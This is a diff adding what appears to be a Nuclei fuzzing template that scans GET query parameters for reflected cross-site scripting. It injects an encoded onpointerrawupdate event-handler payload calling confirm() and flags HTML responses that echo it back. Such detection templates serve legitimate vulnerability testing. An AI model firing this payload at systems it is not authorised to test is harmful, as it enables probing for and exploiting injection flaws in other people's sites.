@@ -1,0 +1,39 @@
+id: fuzz-xss-onpointerrawupdate
+
+info:
+  name: Reflection XSS Using onpointerrawupdate
+  author: netbaan
+  severity: low
+  description: |
+    This template detects reflection XSS vulnerabilities using onpointerrawupdate event.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Only run on GET requests
+
+    payloads:
+      reflection:
+        - "%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
